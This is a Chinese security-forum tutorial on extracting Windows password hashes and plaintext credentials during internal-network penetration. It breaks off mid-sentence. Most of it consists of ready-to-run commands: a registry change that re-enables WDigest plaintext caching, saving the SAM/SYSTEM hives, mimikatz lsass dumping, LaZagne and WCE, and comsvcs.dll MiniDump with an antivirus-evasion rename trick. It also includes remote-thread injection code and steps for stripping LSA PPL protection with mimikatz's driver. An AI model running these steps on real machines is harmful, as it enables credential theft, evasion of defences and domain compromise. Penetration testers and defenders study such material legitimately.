---
title: 内网渗透导出HASH
url: https://forum.butian.net/share/3653
source: 奇安信攻防社区
date: 2024-08-13
fetch_date: 2025-10-06T17:59:17.508641
---

# 内网渗透导出HASH

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 内网渗透导出HASH

* [渗透测试](https://forum.butian.net/topic/47)

在内网渗透中当我们得到一台高权限用户的身份时，就可以抓取到当前机器上的各类密码。
虽然任务要求是导出域hash的方式，但在内网渗透中，获取当前机器的hash也有可能获取到域用户的hash，因此这里也分析一下如何获取当前机器的明文密码。

### 获取当前机器的明文密码
在导出域hash之前，我们可以先尝试导出当前机器的本地的hash密码，如果域用户之前在这台机器上进行登陆操作的话，可以直接获取到域用户甚至域管理员的账号。
在Windows操作系统上，sam数据库（C:\\Windows\\System32\\config\\sam）里保存着本地用户的hash。
在本地认证的流程中，作为本地安全权限服务进程lsass.exe也会把用户密码缓存在内存中（dmp文件）。
因此，在这里我们可以考虑两种方式进行抓取当前机器的hash：在线工具提取，离线分析提取。
注意：在windows 10\\ 2012r2之后的系统版本中，默认情况下已禁用在内存缓存中存系统用户明文密码，此时再直接使用mimikatz去抓明文，肯定是抓不到的。密码字段位会直接显示为null。
这里我们手动修改注册表让其保存明文，方便我们进行抓取。（修改后需要注销用户再登陆）
`reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG\\_DWORD /d 1 /f`
#### mimikatz
mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。
下载地址：<https://github.com/gentilkiwi/mimikatz>
1.通过注册表抓取hash
命令行执行，获取当前系统注册表的SAM、SYSTEM文件（需要本地的管理员权限）
`reg save HKLM\\SYSTEM Sys.hiv`
`reg save HKLM\\SAM Sam.hiv`
获取到文件后可以下载到攻击者本机，离线使用mimikatz分析提取hash。
`mimikatz.exe "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" "exit"`
这个方法只能获取到保存在SAM文件中的本地用户的账户
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687228090321-7409511f-1aca-44f2-b417-c6c09b885bde.png)
2.上传mimikatz进入目标靶机，在线提取本地SAM文件保存的账户hash值
`privilege::debug`
`token::elevate`
`lsadump::sam`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687228675311-5dafca1b-8a05-4d1d-90a1-cd9134b36cb6.png)
3.从lsass.exe的内存中提权hash
`mimikatz "privilege::debug" "sekurlsa::logonpasswords full" "exit"`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687228338654-412a1420-1e39-4ed5-93ef-e319e7de5de1.png)
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687228357773-c99d97e2-6d00-4682-a7ca-558b07732746.png)
发现使用本地用户的管理员权限抓取到了登陆过本机的域管理员的hash值。
#### pwdump7
直接运行PwDump7.exe即可
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687230685350-afc9b599-fc12-4bbf-b771-24f2845caf68.png)
#### WEC
上传到目标靶机添加参数直接运行即可。
-l 列出登录的会话和NTLM凭据（默认值）
-s 修改当前登录会话的NTLM凭据 参数：&lt;用户名&gt;:&lt;域名&gt;:&lt;LM哈希&gt;:&lt;NT哈希&gt;
-r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次
-c 用一个特殊的NTML凭据运行一个新的会话 参数：
-e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次
-o 保存所有的输出到一个文件 参数:&lt;文件名&gt;
-i 指定一个LUID代替使用当前登录会话 参数:
-d 从登录会话中删除NTLM凭据 参数:
-a 使用地址 参数: &lt;地址&gt;
-f 强制使用安全模式
-g 生成LM和NT的哈希 参数&lt;密码&gt;
-K 缓存kerberos票据到一个文件（unix和windows wce格式）
-k 从一个文件中读取kerberos票据并插入到windows缓存中
-w 通过摘要式认证缓存一个明文的密码
-v 详细输出
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687231248684-117d8287-fe78-419b-88e2-7218072ec55f.png)
#### laZagne
下载地址：<https://github.com/AlessandroZ/LaZagne>
`LaZagne.exe all`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1687231627932-5a5cbc26-5899-42e5-a60a-d8d0347a9526.png)
#### SharpDump
<https://github.com/GhostPack/SharpDump>
直接编译即可
`./Sharpdump`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690807356540-f7535e7c-3587-4a81-8a1c-62c18a0cc060.png)
#### LsassSilentProcessExit
<https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w>
Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。
主要使用LsassSilentProcessExit这个api，通过修改注册表+远程进程注入的方式转储内存,相关的注册表键值：
`#define IFEO\\_REG\\_KEY "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\"`
`#define SILENT\\_PROCESS\\_EXIT\\_REG\\_KEY "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\"`
使用远程进程注入让lsass.exe自己调用RtlReportSilentProcessExit函数：
`HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");`
`RtlReportSilentProcessExit\\_func RtlReportSilentProcessExit = (RtlReportSilentProcessExit\\_func)GetProcAddress(hNtdll, "RtlReportSilentProcessExit");`
`HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD\\_START\\_ROUTINE)RtlReportSilentProcessExit, (LPVOID)-1, NULL, NULL);`
但是由于需要修改注册表，因此几乎无法绕过杀软环境。
`LsassSilentProcessExit.exe 616 0`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690793201167-8d97c56d-48f8-4926-9c29-7af22583ffa2.png)
#### 在敏感的环境下转储lsass进程的方式
##### 无文件上传使用powershell导出
<https://blog.csdn.net/chenfeng857/article/details/120126818>
<https://xz.aliyun.com/t/12157#toc-9>
comsvcs.dll，系统自带。通过comsvcs.dll的导出函数MiniDump实现dump内存。
在dump指定进程内存文件时，需要开启SeDebugPrivilege权限。管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled禁用状态
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690807548734-e02c34e0-8114-480a-b8f9-483038b417b6.png)
如果直接在cmd下执行rundll32的命令尝试dump指定进程内存文件的话，由于无法开启SeDebugPrivilege权限，会dump失败。
但是，在管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为已启用。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690807617117-5603206c-efab-4883-9936-010f9aa3153d.png)
首先查看lsass.exe进程PID
`tasklist | findstr lsass.exe`
`rundll32.exe comsvcs.dll MiniDump PID Path full`
`rundll32.exe comsvcs.dll MiniDump 1096 C:\\Users\\16229\\Desktop\\1.dmp full`
直接运行的话有可能会被杀软拦截。
一个简单的绕过思路：
copycomsvcs.dll到不敏感的目录，并随机命名，例如test.dll
`copy C:\\windows\\System32\\comsvcs.dll test.dll`
`rundll32.exe C:\\Users\\16229\\Desktop\\code\\_java\\test.dll MiniDump 1096 C:\\Users\\16229\\Desktop\\code\\_java\\3.dmp full`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690808250601-c37d4d8f-ce81-48ae-aad3-01c8f2885feb.png)
拖到本地使用mimikatz进行分析即可。
`mimikatz.exe log "sekurlsa::minidump 2.dmp" "sekurlsa::logonPasswords full" exit`
##### 在开启runasppl的环境下
<https://www.freebuf.com/articles/system/332506.html>
<https://xz.aliyun.com/t/12157#toc-19>
###### mimikatz
在开启PPL保护的情况下，即使是管理员也无法打开lsass进程。
`mimikatz "privilege::debug" "sekurlsa::logonpasswords full" "exit"`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690872251950-d42fa1e7-2afa-45b6-a4e3-fa91ae817f3e.png)
Mimikatzprivilege::debug中的命令成功启用；SeDebugPrivilege，但是该命令sekurlsa::logonpasswords失败并出现错误代码0x00000005，从minikatz代码kuhl\\_m\\_sekurlsa\\_acquireLSA()函数中我们可以简单了解为
```php
HANDLE hData = NULL;
DWORD pid;
DWORD processRights = PROCESS\_VM\_READ | PROCESS\_QUERY\_INFORMATION;
kull\_m\_process\_getProcessIdForName(L"lsass.exe", &pid);
hData = OpenProcess(processRights, FALSE, pid);
if (hData && hData != INVALID\_HANDLE\_VALUE) {
// if OpenProcess OK
}
else {
PRINT\_ERROR\_AUTO(L"Handle on memory");
}
```
使用process explorer打开lsass进程查看，显示拒绝访问。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690872660666-f183fded-53e0-4026-8453-db2d53627dd6.png)
在Mimikatz中使用数字签名的驱动程序来删除内核中 Process 对象的保护标志
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690872780816-98d5892a-bbe1-4047-8018-9b920f44e9c7.png)
minikatz安装驱动程序
privilege::debug
!+
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690872939730-a34892eb-7edf-4d5c-b263-8a9bb20fb490.png)
删除保护
`!processprotect /process:lsass.exe /remove`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690873034669-72571a13-1020-4e5a-955d-bcafc0896bf3.png)
然后就可以dump密码了
`sekurlsa::logonpasswords`
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690873096342-a0046ad2-dff6-4525-9fef-5f7a6b4704cc.png)
使用工具查看发现保护已经被删除了
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1690873263159-28049682-3f7f-403e-b0a3-a569c1ee161c.png)
`mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"`
###### PPLKILLER
<https://www.cnblogs.com/revercc/p/16961961.html>
<https://redcursor.com.au/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10/>
优先级区别：PP 可以以完全访问权限打开 PP 或 PPL，只要其签名者级别大于或等于；一个 PPL 可以打开另一个具有完全访问权限的 PPL，只要其签名者级别大于或等于；无论签名者级别如何，PPL...